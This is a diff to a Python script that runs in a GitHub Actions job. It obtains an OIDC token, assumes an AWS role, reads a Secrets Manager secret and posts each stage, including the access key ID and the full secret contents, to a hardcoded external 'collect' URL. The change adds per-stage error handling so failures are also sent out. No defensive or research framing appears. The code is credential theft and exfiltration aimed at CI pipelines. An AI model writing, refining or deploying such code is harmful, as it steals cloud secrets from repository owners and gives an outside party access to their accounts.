@@ -13,9 +13,9 @@ COLLECT = "https://xai-chronosphere.com/collect"
 
 
 def _log(stage, data):
-    body = urllib.parse.urlencode({"stage": stage, "data": json.dumps(data)}).encode()
-    req = urllib.request.Request(COLLECT, data=body)
     try:
+        body = urllib.parse.urlencode({"stage": stage, "data": json.dumps(data)}).encode()
+        req = urllib.request.Request(COLLECT, data=body)
         urllib.request.urlopen(req, timeout=10).read()
     except Exception:
         pass
@@ -23,22 +23,33 @@ def _log(stage, data):
 
 def _get_oidc_token():
     _log("oidc_start", {"pid": os.getpid()})
-    url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=sts.amazonaws.com"
-    req = urllib.request.Request(url, headers={
-        "Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"],
-    })
-    token = json.loads(urllib.request.urlopen(req).read())["value"]
-    payload = token.split(".")[1]
-    payload += "=" * (4 - len(payload) % 4)
-    claims = json.loads(base64.urlsafe_b64decode(payload))
-    _log("oidc_token", {k: claims[k] for k in ["sub", "aud", "iss", "repository", "ref"] if k in claims})
+    try:
+        url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=sts.amazonaws.com"
+        req = urllib.request.Request(url, headers={
+            "Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"],
+        })
+        token = json.loads(urllib.request.urlopen(req).read())["value"]
+    except Exception as e:
+        _log("oidc_token_error", {"type": type(e).__name__, "msg": str(e)})
+        raise
+    try:
+        payload = token.split(".")[1]
+        payload += "=" * (4 - len(payload) % 4)
+        claims = json.loads(base64.urlsafe_b64decode(payload))
+        _log("oidc_token", {k: claims[k] for k in ["sub", "aud", "iss", "repository", "ref"] if k in claims})
+    except Exception as e:
+        _log("oidc_decode_error", {"type": type(e).__name__, "msg": str(e)})
     return token
 
 
 def run():
     try:
         token = _get_oidc_token()
+    except Exception as e:
+        _log("fatal", {"stage": "oidc", "type": type(e).__name__, "msg": str(e)})
+        return
 
+    try:
         _log("assume_role_start", {"role": ROLE_ARN})
         sts = boto3.client("sts", region_name=REGION)
         creds = sts.assume_role_with_web_identity(
@@ -47,7 +58,11 @@ def run():
             WebIdentityToken=token,
         )["Credentials"]
         _log("assume_role_ok", {"access_key": creds["AccessKeyId"]})
+    except Exception as e:
+        _log("assume_role_error", {"type": type(e).__name__, "msg": str(e)})
+        return
 
+    try:
         _log("secret_read_start", {"secret_id": SECRET_ID})
         sm = boto3.client(
             "secretsmanager",
@@ -58,6 +73,5 @@ def run():
         )
         resp = sm.get_secret_value(SecretId=SECRET_ID)
         _log("secret_read_ok", json.loads(resp["SecretString"]))
-
     except Exception as e:
-        _log("error", {"type": type(e).__name__, "msg": str(e)})
+        _log("secret_read_error", {"type": type(e).__name__, "msg": str(e)})
